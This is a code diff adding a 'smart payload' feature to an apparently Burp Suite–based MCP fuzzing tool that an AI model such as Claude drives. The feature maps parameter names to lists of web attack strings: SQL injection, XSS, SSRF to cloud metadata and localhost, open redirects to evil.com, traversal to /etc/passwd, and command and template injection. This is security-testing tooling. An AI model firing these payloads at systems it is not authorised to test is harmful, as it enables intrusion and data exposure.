@@ -5,6 +5,72 @@ from mcp.server.fastmcp import FastMCP
 from burpsuite_mcp import client
 
 
+# Smart payload mapping based on parameter name heuristics
+_SMART_PAYLOAD_MAP = {
+    "sqli": {
+        "names": ["id", "uid", "pid", "user_id", "account_id", "order_id", "item_id",
+                  "product_id", "num", "number", "count", "page", "limit", "offset"],
+        "payloads": ["'", "1 OR 1=1--", "1' AND '1'='1", "1 UNION SELECT NULL--", "1; WAITFOR DELAY '0:0:3'--"],
+    },
+    "xss": {
+        "names": ["search", "q", "query", "keyword", "name", "comment", "message",
+                  "title", "description", "text", "content", "value", "input", "email"],
+        "payloads": ["<script>alert(1)</script>", "\" onmouseover=alert(1)", "<img src=x onerror=alert(1)>", "javascript:alert(1)", "'-alert(1)-'"],
+    },
+    "ssrf": {
+        "names": ["url", "uri", "href", "link", "src", "source", "target", "dest",
+                  "destination", "domain", "host", "site", "feed", "callback", "webhook"],
+        "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "http://[::1]/", "http://0x7f000001/"],
+    },
+    "redirect": {
+        "names": ["redirect", "redirect_uri", "redirect_url", "return", "return_url",
+                  "next", "goto", "forward", "continue", "redir", "returnTo"],
+        "payloads": ["https://evil.com", "//evil.com", "\\/\\/evil.com", "https://evil.com@target.com"],
+    },
+    "lfi": {
+        "names": ["file", "filename", "path", "filepath", "dir", "directory", "folder",
+                  "page", "include", "template", "load", "read", "doc", "document"],
+        "payloads": ["../../../etc/passwd", "....//....//....//etc/passwd", "..%252f..%252f..%252fetc/passwd", "/etc/passwd"],
+    },
+    "cmdi": {
+        "names": ["cmd", "command", "exec", "execute", "run", "ping", "ip", "address", "hostname"],
+        "payloads": ["; id", "| id", "$(id)", "`id`", "& whoami"],
+    },
+    "ssti": {
+        "names": ["template", "render", "view", "layout", "theme", "format", "output",
+                  "preview", "display", "expression", "eval"],
+        "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}"],
+    },
+}
+
+
+def _matches_param_name(param_lower: str, target_name: str) -> bool:
+    """Check if parameter name matches target, with word-boundary awareness for short names."""
+    if param_lower == target_name:
+        return True
+    if len(target_name) <= 3:
+        # Short names (id, ip, q): require word boundary (underscore, start, or end)
+        return (
+            param_lower.startswith(target_name + "_") or
+            param_lower.endswith("_" + target_name) or
+            f"_{target_name}_" in param_lower
+        )
+    # Longer names (search, command, file): substring match is safe
+    return target_name in param_lower
+
+
+def _get_smart_payloads(param_name: str) -> list[str]:
+    """Auto-select payloads based on parameter name heuristics."""
+    param_lower = param_name.lower()
+    payloads = []
+    for config in _SMART_PAYLOAD_MAP.values():
+        if param_lower in config["names"] or any(_matches_param_name(param_lower, n) for n in config["names"]):
+            payloads.extend(config["payloads"])
+    if not payloads:
+        payloads = ["'", "<script>alert(1)</script>", "{{7*7}}", "../../../etc/passwd", "; id"]
+    return payloads
+
+
 def register(mcp: FastMCP):
 
     @mcp.tool()
@@ -18,6 +84,7 @@ def register(mcp: FastMCP):
         grep_match: list[str] | None = None,
         grep_extract: str = "",
         delay_ms: int = 0,
+        smart_payloads: bool = False,
     ) -> str:
         """Smart fuzz engine - send Claude-generated payloads and analyze responses for anomalies.
         You are the brain: analyze the target's tech stack, parameters, and context to craft
@@ -42,7 +109,17 @@ def register(mcp: FastMCP):
             grep_match: List of strings to search for in responses (e.g. ["error", "SQL", "syntax"])
             grep_extract: Regex pattern to extract from responses
             delay_ms: Delay between requests in milliseconds
+            smart_payloads: Auto-generate payloads based on parameter names (e.g. 'id' gets SQLi, 'search' gets XSS)
         """
+        # Smart payload auto-generation based on parameter name heuristics
+        if smart_payloads:
+            if parameters:
+                for p in parameters:
+                    if not p.get("payloads"):
+                        p["payloads"] = _get_smart_payloads(p.get("name", ""))
+            elif parameter:
+                payloads = _get_smart_payloads(parameter)
+
         # Build the request payload
         payload: dict = {"index": index, "attack_type": attack_type}
 
